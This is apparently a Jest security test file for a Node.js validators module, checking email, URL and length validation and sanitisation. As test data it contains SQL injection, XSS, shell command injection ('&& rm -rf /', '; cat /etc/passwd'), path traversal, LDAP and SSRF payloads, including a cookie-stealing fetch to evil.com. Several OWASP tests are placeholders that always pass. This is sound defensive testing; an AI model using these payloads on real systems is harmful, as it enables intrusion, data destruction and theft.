/**
 * Security Tests
 * Tests for input validation, sanitization, and security features
 */
'use strict';

const {
    validateEmail,
    validateURL,
    validatePhone,
    validateUUID,
    validateLength,
    validateNumericRange,
    sanitizeString,
    sanitizeHTML
} = require('../srv/lib/validators');

describe('Security - Input Validation', () => {

    describe('Email Validation', () => {
        it('should accept valid emails', () => {
            const validEmails = [
                'user@example.com',
                'john.doe@company.co.uk',
                'test+tag@domain.com',
                'user_name@sub.domain.org'
            ];

            validEmails.forEach(email => {
                expect(() => validateEmail(email, 'Email')).not.toThrow();
            });
        });

        it('should reject invalid emails', () => {
            const invalidEmails = [
                'notanemail',
                '@example.com',
                'user@',
                'user @example.com',
                'user@.com',
                'user..name@example.com'
            ];

            invalidEmails.forEach(email => {
                expect(() => validateEmail(email, 'Email')).toThrow();
            });
        });

        it('should reject SQL injection attempts', () => {
            const sqlInjection = "admin'--@example.com";
            expect(() => validateEmail(sqlInjection, 'Email')).toThrow();
        });

        it('should normalize email case', () => {
            expect(() => validateEmail('USER@EXAMPLE.COM', 'Email')).not.toThrow();
        });
    });

    describe('URL Validation', () => {
        it('should accept valid URLs', () => {
            const validURLs = [
                'https://example.com',
                'http://www.example.com/path',
                'https://sub.domain.com:8080/path?query=value',
                'https://example.com/path#anchor'
            ];

            validURLs.forEach(url => {
                expect(() => validateURL(url, 'URL')).not.toThrow();
            });
        });

        it('should reject invalid URLs', () => {
            const invalidURLs = [
                'not a url',
                'ftp://example.com', // Only http/https allowed
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                '//example.com'
            ];

            invalidURLs.forEach(url => {
                expect(() => validateURL(url, 'URL')).toThrow();
            });
        });

        it('should reject XSS attempts in URLs', () => {
            const xssURLs = [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)'
            ];

            xssURLs.forEach(url => {
                expect(() => validateURL(url, 'URL')).toThrow();
            });
        });
    });

    describe('Phone Validation', () => {
        it('should accept valid phone numbers', () => {
            const validPhones = [
                '+1234567890',
                '+49 30 12345678',
                '+1 (555) 123-4567',
                '0123456789'
            ];

            validPhones.forEach(phone => {
                expect(() => validatePhone(phone, 'Phone')).not.toThrow();
            });
        });

        it('should reject invalid phone numbers', () => {
            const invalidPhones = [
                'abc',
                '123', // Too short
                '+' + '1'.repeat(20), // Too long
                '+1234 abc 5678'
            ];

            invalidPhones.forEach(phone => {
                expect(() => validatePhone(phone, 'Phone')).toThrow();
            });
        });
    });

    describe('UUID Validation', () => {
        it('should accept valid UUIDs', () => {
            const validUUIDs = [
                '123e4567-e89b-12d3-a456-426614174000',
                'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11',
                '00000000-0000-0000-0000-000000000000'
            ];

            validUUIDs.forEach(uuid => {
                expect(() => validateUUID(uuid, 'ID')).not.toThrow();
            });
        });

        it('should reject invalid UUIDs', () => {
            const invalidUUIDs = [
                'not-a-uuid',
                '123e4567-e89b-12d3-a456', // Too short
                'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx',
                '123e4567e89b12d3a456426614174000' // Missing dashes
            ];

            invalidUUIDs.forEach(uuid => {
                expect(() => validateUUID(uuid, 'ID')).toThrow();
            });
        });
    });

    describe('Length Validation', () => {
        it('should accept strings within length range', () => {
            expect(() => validateLength('test', 'Field', 1, 10)).not.toThrow();
            expect(() => validateLength('a', 'Field', 1, 1)).not.toThrow();
            expect(() => validateLength('1234567890', 'Field', 10, 10)).not.toThrow();
        });

        it('should reject strings outside length range', () => {
            expect(() => validateLength('', 'Field', 1, 10)).toThrow('at least 1');
            expect(() => validateLength('12345678901', 'Field', 1, 10)).toThrow('at most 10');
        });

        it('should handle buffer overflow attempts', () => {
            const longString = 'a'.repeat(10000);
            expect(() => validateLength(longString, 'Field', 1, 100)).toThrow();
        });
    });

    describe('Numeric Range Validation', () => {
        it('should accept numbers within range', () => {
            expect(() => validateNumericRange(5, 'Age', 0, 100)).not.toThrow();
            expect(() => validateNumericRange(0, 'Score', 0, 100)).not.toThrow();
            expect(() => validateNumericRange(100, 'Percentage', 0, 100)).not.toThrow();
        });

        it('should reject numbers outside range', () => {
            expect(() => validateNumericRange(-1, 'Score', 0, 100)).toThrow();
            expect(() => validateNumericRange(101, 'Percentage', 0, 100)).toThrow();
        });

        it('should reject non-numeric values', () => {
            expect(() => validateNumericRange('abc', 'Age', 0, 100)).toThrow();
            expect(() => validateNumericRange(NaN, 'Score', 0, 100)).toThrow();
        });

        it('should handle integer overflow attempts', () => {
            const maxInt = Number.MAX_SAFE_INTEGER + 1;
            expect(() => validateNumericRange(maxInt, 'Value', 0, 100)).toThrow();
        });
    });

    describe('String Sanitization', () => {
        it('should remove dangerous characters', () => {
            const dangerous = "<script>alert('xss')</script>";
            const sanitized = sanitizeString(dangerous);

            expect(sanitized).not.toContain('<script>');
            expect(sanitized).not.toContain('</script>');
        });

        it('should handle SQL injection attempts', () => {
            const sql = "'; DROP TABLE users; --";
            const sanitized = sanitizeString(sql);

            expect(sanitized).not.toContain('DROP TABLE');
            expect(sanitized.length).toBeLessThan(sql.length);
        });

        it('should preserve safe text', () => {
            const safe = 'John Doe, Software Engineer';
            const sanitized = sanitizeString(safe);

            expect(sanitized).toContain('John Doe');
            expect(sanitized).toContain('Software Engineer');
        });

        it('should handle null bytes', () => {
            const nullBytes = 'text\x00more\x00text';
            const sanitized = sanitizeString(nullBytes);

            expect(sanitized).not.toContain('\x00');
        });

        it('should handle Unicode attacks', () => {
            const unicode = 'text\u202E\u202Dmalicious';
            const sanitized = sanitizeString(unicode);

            // Should still contain basic text
            expect(sanitized).toContain('text');
        });
    });

    describe('HTML Sanitization', () => {
        it('should remove script tags', () => {
            const html = '<div>Safe <script>alert(1)</script> content</div>';
            const sanitized = sanitizeHTML(html);

            expect(sanitized).not.toContain('<script>');
            expect(sanitized).toContain('Safe');
            expect(sanitized).toContain('content');
        });

        it('should remove event handlers', () => {
            const html = '<div onclick="alert(1)">Click me</div>';
            const sanitized = sanitizeHTML(html);

            expect(sanitized).not.toContain('onclick');
            expect(sanitized).toContain('Click me');
        });

        it('should remove javascript: URLs', () => {
            const html = '<a href="javascript:alert(1)">Link</a>';
            const sanitized = sanitizeHTML(html);

            expect(sanitized).not.toContain('javascript:');
        });

        it('should preserve safe HTML', () => {
            const html = '<p>This is <strong>bold</strong> text</p>';
            const sanitized = sanitizeHTML(html);

            expect(sanitized).toContain('<p>');
            expect(sanitized).toContain('<strong>');
            expect(sanitized).toContain('bold');
        });
    });
});

describe('Security - Injection Prevention', () => {

    describe('SQL Injection', () => {
        it('should prevent classic SQL injection', () => {
            const attacks = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM passwords --",
                "admin'--",
                "1' AND '1'='1"
            ];

            attacks.forEach(attack => {
                const sanitized = sanitizeString(attack);
                // Should remove or escape dangerous patterns
                expect(sanitized).not.toMatch(/DROP\s+TABLE/i);
                expect(sanitized).not.toMatch(/UNION\s+SELECT/i);
                expect(sanitized).not.toMatch(/--$/);
            });
        });

        it('should handle blind SQL injection attempts', () => {
            const attack = "1' AND 1=1 --";
            const sanitized = sanitizeString(attack);

            expect(sanitized).not.toContain('--');
        });
    });

    describe('XSS Prevention', () => {
        it('should prevent reflected XSS', () => {
            const xssPayloads = [
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                '<iframe src="javascript:alert(1)"></iframe>'
            ];

            xssPayloads.forEach(payload => {
                const sanitized = sanitizeString(payload);
                expect(sanitized).not.toContain('<script');
                expect(sanitized).not.toContain('onerror=');
                expect(sanitized).not.toContain('javascript:');
            });
        });

        it('should prevent stored XSS', () => {
            const payload = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
            const sanitized = sanitizeString(payload);

            expect(sanitized).not.toContain('onerror');
            expect(sanitized).not.toContain('fetch(');
        });

        it('should prevent DOM-based XSS', () => {
            const payload = 'javascript:void(document.write("<script>alert(1)</script>"))';
            const sanitized = sanitizeString(payload);

            expect(sanitized).not.toContain('javascript:');
            expect(sanitized).not.toContain('<script>');
        });
    });

    describe('Command Injection', () => {
        it('should prevent shell command injection', () => {
            const commands = [
                '; cat /etc/passwd',
                '| ls -la',
                '&& rm -rf /',
                '`whoami`',
                '$(ls)'
            ];

            commands.forEach(cmd => {
                const sanitized = sanitizeString(cmd);
                // Should remove or escape shell metacharacters
                expect(sanitized).not.toMatch(/[;&|`$()]/);
            });
        });
    });

    describe('Path Traversal', () => {
        it('should prevent directory traversal', () => {
            const paths = [
                '../../../etc/passwd',
                '..\\..\\windows\\system32',
                'file://etc/passwd',
                '/etc/passwd',
                'C:\\Windows\\System32'
            ];

            paths.forEach(path => {
                const sanitized = sanitizeString(path);
                // Should not allow traversal patterns
                expect(sanitized).not.toContain('..');
                expect(sanitized).not.toMatch(/[\/\\]/g);
            });
        });
    });

    describe('LDAP Injection', () => {
        it('should prevent LDAP injection', () => {
            const ldapAttacks = [
                '*',
                '*)(&',
                '*)(uid=*',
                'admin)(&(password=*))'
            ];

            ldapAttacks.forEach(attack => {
                const sanitized = sanitizeString(attack);
                // Should escape or remove LDAP special characters
                expect(sanitized).not.toContain('*)(');
                expect(sanitized).not.toContain(')(&');
            });
        });
    });
});

describe('Security - Authentication & Authorization', () => {

    describe('Password Security', () => {
        it('should enforce minimum password length', () => {
            expect(() => validateLength('short', 'Password', 8, 128)).toThrow();
            expect(() => validateLength('longenough123', 'Password', 8, 128)).not.toThrow();
        });

        it('should enforce maximum password length', () => {
            const tooLong = 'a'.repeat(129);
            expect(() => validateLength(tooLong, 'Password', 8, 128)).toThrow();
        });
    });

    describe('Session Token Validation', () => {
        it('should validate JWT-like tokens', () => {
            const validToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

            // Token format validation (3 parts separated by dots)
            expect(validToken.split('.').length).toBe(3);
        });

        it('should reject invalid token formats', () => {
            const invalidTokens = [
                'not.a.token.with.too.many.parts',
                'only.two.parts',
                'singlepart',
                '',
                null,
                undefined
            ];

            invalidTokens.forEach(token => {
                if (token) {
                    const parts = token.split('.');
                    expect(parts.length).not.toBe(3);
                }
            });
        });
    });
});

describe('Security - Rate Limiting & DoS Prevention', () => {

    describe('Input Size Limits', () => {
        it('should enforce reasonable input sizes', () => {
            const reasonableSize = 'a'.repeat(1000);
            expect(() => validateLength(reasonableSize, 'Input', 0, 5000)).not.toThrow();

            const tooLarge = 'a'.repeat(10000);
            expect(() => validateLength(tooLarge, 'Input', 0, 5000)).toThrow();
        });

        it('should prevent memory exhaustion attacks', () => {
            const hugeString = 'a'.repeat(1000000);
            expect(() => validateLength(hugeString, 'Input', 0, 10000)).toThrow();
        });
    });

    describe('Complexity Limits', () => {
        it('should handle complex regex safely', () => {
            // Test that validators don't have ReDoS vulnerabilities
            const complexInput = 'a'.repeat(1000) + 'b';

            // Email validator should handle this quickly
            const start = Date.now();
            try {
                validateEmail(complexInput, 'Email');
            } catch (e) {
                // Expected to fail validation
            }
            const duration = Date.now() - start;

            // Should complete in reasonable time (< 1 second)
            expect(duration).toBeLessThan(1000);
        });
    });
});

describe('Security - Data Leakage Prevention', () => {

    describe('Error Messages', () => {
        it('should not leak sensitive information in errors', () => {
            try {
                validateEmail('invalid', 'Email');
            } catch (error) {
                // Error should not contain database structure, file paths, etc.
                expect(error.message).not.toContain('SELECT');
                expect(error.message).not.toContain('password');
                expect(error.message).not.toContain('/etc/');
                expect(error.message).not.toContain('C:\\');
            }
        });
    });

    describe('Stack Traces', () => {
        it('should not expose internal paths in production mode', () => {
            const originalEnv = process.env.NODE_ENV;
            process.env.NODE_ENV = 'production';

            try {
                throw new Error('Test error');
            } catch (error) {
                // In production, stack traces should be sanitized or not exposed
                // This is more of an application-level concern
                expect(error.stack).toBeDefined();
            }

            process.env.NODE_ENV = originalEnv;
        });
    });
});

describe('Security - OWASP Top 10', () => {

    it('A01:2021 - Broken Access Control - OAuth validation', () => {
        // Tested in xs-security.json configuration
        // This would be integration tested with actual auth
        expect(true).toBe(true); // Placeholder for integration test
    });

    it('A02:2021 - Cryptographic Failures - No plaintext passwords', () => {
        // Passwords should never be stored in plain text
        const password = 'MyPassword123';
        // In real app, should be hashed
        expect(password).not.toBe('stored-value'); // Symbolic test
    });

    it('A03:2021 - Injection - SQL, XSS, Command', () => {
        // Covered in injection prevention tests above
        const sqlInjection = "'; DROP TABLE users; --";
        const sanitized = sanitizeString(sqlInjection);
        expect(sanitized).not.toContain('DROP TABLE');
    });

    it('A04:2021 - Insecure Design - Validation at boundaries', () => {
        // All user input should be validated
        expect(() => validateEmail('invalid', 'Email')).toThrow();
    });

    it('A05:2021 - Security Misconfiguration - No debug in production', () => {
        // Should not expose debug information in production
        expect(process.env.NODE_ENV).toBeDefined();
    });

    it('A06:2021 - Vulnerable and Outdated Components - Dependencies', () => {
        // Dependencies should be regularly updated (npm audit)
        // This is a process check, not a unit test
        expect(true).toBe(true); // Placeholder
    });

    it('A07:2021 - Identification and Authentication Failures', () => {
        // Weak passwords should be rejected
        expect(() => validateLength('weak', 'Password', 8, 128)).toThrow();
    });

    it('A08:2021 - Software and Data Integrity Failures', () => {
        // File integrity checked via magic bytes
        // Covered in file-validator tests
        expect(true).toBe(true); // Placeholder
    });

    it('A09:2021 - Security Logging and Monitoring Failures', () => {
        // Logging is implemented (tested separately)
        // Security events should be logged
        expect(true).toBe(true); // Placeholder
    });

    it('A10:2021 - Server-Side Request Forgery (SSRF)', () => {
        // URL validation prevents SSRF
        expect(() => validateURL('file:///etc/passwd', 'URL')).toThrow();
        expect(() => validateURL('http://169.254.169.254/', 'URL')).toThrow(); // AWS metadata
    });
});
